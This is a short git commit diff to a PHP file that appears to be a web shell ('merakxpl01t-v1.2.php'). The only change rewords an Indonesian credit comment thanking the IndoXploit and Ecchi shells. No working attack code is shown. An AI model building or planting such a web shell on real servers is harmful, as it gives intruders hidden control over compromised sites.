09d83af3b0b14a16391762c8c8642f681afd9324
merak <77441249+didin-pixel@users.noreply.github.com>
2026-09-22 19:49:59 +0700

    Update merakxpl01t-v1.2.php

--- merakxpl01t-v1.2.php
+++ merakxpl01t-v1.2.php
@@ -94,7 +94,7 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
 <!--
 ###############################################################################
 // Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
-// Thanks Untuk IndoXploit dan Ecchi shell sebagai referensi utama shell ini.
+// Special Thanks Untuk IndoXploit dan Ecchi shell sebagai referensi utama shell ini.
 // Greetz: All Member MerakXpl01t. & All My Friends.
 ###############################################################################
 -->
